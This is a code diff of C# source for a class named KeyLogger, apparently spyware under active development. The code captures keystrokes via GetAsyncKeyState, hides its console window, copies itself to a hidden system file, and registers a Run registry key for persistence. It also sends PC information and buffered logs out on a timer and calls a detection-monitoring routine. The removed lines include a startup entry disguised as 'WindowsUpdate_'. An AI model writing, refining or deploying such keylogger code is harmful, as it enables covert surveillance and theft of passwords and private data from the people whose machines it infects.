@@ -49,16 +49,9 @@ class KeyLogger
 
     const int SW_HIDE = 0;
 
-
     // Key state detection
     [DllImport("user32.dll")]
     private static extern short GetAsyncKeyState(int vKey);
-
-    // Windows API constants
-    private const int SW_SHOW = 5;
-    private const int VK_SHIFT = 160;
-    private const int VK_CONTROL = 162;
-    private const int VK_ALT = 164;
 
     // Key mapping with enhanced support
     private static readonly Dictionary<int, string> KeyMapping = new Dictionary<int, string>
@@ -116,31 +109,15 @@ class KeyLogger
     {
         try
         {
-            // Initialize keylogger
             InitializeKeyLogger();
-
-            // Add to startup
-            AddToStartup();
-
-            //HideConsoleWindow();
-
-            // Start logging
             StartLogging();
-
-            // Send initial PC information
             Task.Run(async () => await SendPCInfo());
-
-            // Monitor for detection
             MonitorForDetection();
-        
             CopyToSecureLocation();
-
-            //SetupProcessHiding();
 
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
 
-            // Your background logic
             RunBackgroundProcess();
         }
         catch (Exception ex)
@@ -164,45 +141,6 @@ class KeyLogger
         logTimer = new Timer(SendBufferedLogs, null, LogInterval, LogInterval);
     }
 
-    private static void HideConsoleWindow()
-    {
-        try
-        {
-            IntPtr consoleWindow = GetConsoleWindow();
-            if (consoleWindow != IntPtr.Zero)
-            {
-                ShowWindow(consoleWindow, SW_HIDE);
-            }
-        }
-        catch (Exception ex)
-        {
-            LogToFile($"Failed to hide console window: {ex.Message}");
-        }
-    }
-
-    private static void AddToStartup()
-    {
-        try
-        {
-            // Check if we're on Windows before accessing Registry
-            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
-            {
-                string key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
-                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(key, true))
-                {
-                    if (registryKey != null)
-                    {
-                        string assemblyPath = Process.GetCurrentProcess().MainModule.FileName;
-                        string processName = Path.GetFileNameWithoutExtension(assemblyPath);
-
-                        // Use a less suspicious name
-                        registryKey.SetValue($"WindowsUpdate_{processName}", assemblyPath);
-                    }
-                }
-            }
-        }
-        catch { /* Silent failure */ }
-    }
     static void RunBackgroundProcess()
     {
         // Keep running indefinitely
@@ -219,22 +157,6 @@ class KeyLogger
                 Console.WriteLine($"Error: {ex.Message}");
                 Thread.Sleep(1000);
             }
-        }
-    }
-    private static void SetupProcessHiding()
-    {
-        try
-        {
-            IntPtr consoleWindow = GetConsoleWindow();
-            if (consoleWindow != IntPtr.Zero)
-            {
-                ShowWindow(consoleWindow, SW_HIDE);
-            }
-            SetConsoleCtrlHandler(new HandlerRoutine(ConsoleCtrlHandler), true);
-        }
-        catch (Exception ex)
-        {
-            LogToFile($"Process hiding setup error: {ex.Message}");
         }
     }
 
@@ -255,11 +177,35 @@ class KeyLogger
                 File.Copy(currentExecutable, SecureExecutable);
                 LogToFile($"Copied to secure location: {SecureExecutable}");
                 File.SetAttributes(SecureExecutable, FileAttributes.Hidden | FileAttributes.System);
+
+                // Add to Windows startup
+                AddToStartup(SecureExecutable);
             }
         }
         catch (Exception ex)
         {
             LogToFile($"Secure copy error: {ex.Message}");
+        }
+    }
+
+    private static void AddToStartup(string executablePath)
+    {
+        try
+        {
+            string startupKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(startupKey, true))
+            {
+                if (key != null)
+                {
+                    string appName = Path.GetFileNameWithoutExtension(executablePath);
+                    key.SetValue(appName, executablePath);
+                    LogToFile($"Added to startup: {appName}");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            LogToFile($"Error adding to startup: {ex.Message}");
         }
     }
 
